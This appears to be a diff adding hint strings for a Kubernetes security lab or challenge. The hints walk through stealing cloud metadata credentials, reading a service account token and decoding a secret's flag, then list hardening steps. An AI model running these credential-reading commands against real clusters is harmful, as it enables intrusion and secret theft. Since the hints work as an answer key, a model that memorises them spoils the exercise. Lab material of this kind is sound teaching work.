@@ -1,0 +1,5 @@
+[
+  "Start with: kubectl exec -it attack-pod -n dojo-sec-boss -- sh. Then curl http://fake-imds-svc/latest/meta-data/iam/security-credentials/node-role for attack-token-1",
+  "For SA token abuse: cat /var/run/secrets/kubernetes.io/serviceaccount/token (first 20 chars). For secret enumeration: kubectl get secret db-creds -n dojo-sec-boss -o jsonpath='{.data.flag}' | base64 -d",
+  "After collecting all 5 attack tokens, harden in order: (1) kubectl delete clusterrolebinding boss-overprivileged-binding, (2) NetworkPolicy blocking 169.254.169.254, (3) delete+recreate attack-pod without DB_PASSWORD, (4) kubectl label namespace dojo-sec-boss pod-security.kubernetes.io/enforce=restricted, (5) kubectl create configmap falco-active -n dojo-sec-boss --from-literal=status=enabled"
+]
